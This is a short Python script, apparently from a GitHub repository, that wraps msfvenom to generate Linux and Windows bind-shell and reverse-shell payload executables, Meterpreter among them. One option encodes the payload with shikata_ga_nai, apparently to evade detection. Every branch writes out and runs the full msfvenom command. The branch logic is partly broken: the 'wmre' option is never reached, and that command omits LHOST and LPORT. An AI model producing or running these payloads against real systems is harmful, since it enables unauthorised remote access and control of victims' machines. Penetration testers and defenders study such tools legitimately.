import os
import sys


def banner():
    print("-"*17+" Venom "+"-"*17)
    print("\nQuick msfvenom payloads")
    print("\nCreated By:(https://github.com/mrjoker05)\n")
    print("-"*42+"\n")

def usage():
    print("# Usage: python3 Venom.py <IP> <Port> <Type> ")
    print()
    print("# Types:")
    print(" * lsb : Linux Shell Bind")
    print(" * lmb : Linux Meterpreter Bind")
    print(" * lmr : Linux Meterpreter Reverse")
    print(" * wsr : Windows Shell Reverse")
    print(" * wmr : Windows Meterpreter Reverse")
    print(" * wmre : Windows Meterpreter Reverse Encoded")
    print()
    print("# Example: python3 Venom.py 10.10.10.10 1234 wmr")

def main():
    if len(sys.argv) != 4:
        usage()
        sys.exit()

    script , ip , port , shell = sys.argv
    shell = shell.lower()


    # Linux shell bind
    if "lsb" in shell:
        payload = f'msfvenom -p generic/shell_bind_tcp RHOST={ip} LPORT={port} -f elf > term.elf'
        print("Executing: " + payload)
        os.system(payload)

    # Linux meterpreter bind
    elif "lmb" in shell:
        payload = f'msfvenom -p linux/x86/meterpreter/bind_tcp RHOST={ip} LPORT={port} -f elf > bind.elf'
        print("Executing: " + payload)
        os.system(payload)

    # Linux meterpreter reverse
    elif "lmr" in shell:
        payload = f'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf > shell.elf'
        print("Executing: " + payload)
        os.system(payload)

    # Windows shell reverse
    elif "wsr" in shell:
        payload = f'msfvenom -p windows/shell/reverse_tcp LHOST={ip} LPORT={port} -f exe > shell.exe'
        print("Executing: " + payload)
        os.system(payload)

    # Windows meterpterter reverse
    elif "wmr" in shell:
        payload = f'msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe > shell.exe'
        print("Executing: " + payload)
        os.system(payload)

    # Windows Encoded Meterpreter Windows Reverse Shell
    elif "wmre" in shell:
        payload = f'msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe'
        print("Executing: " + payload)
        os.system(payload)
    
    else:
        print("Wrong shell type requested..!!!")
        print()
        usage()
        sys.exit()



if __name__ == "__main__":
    banner()
    main()
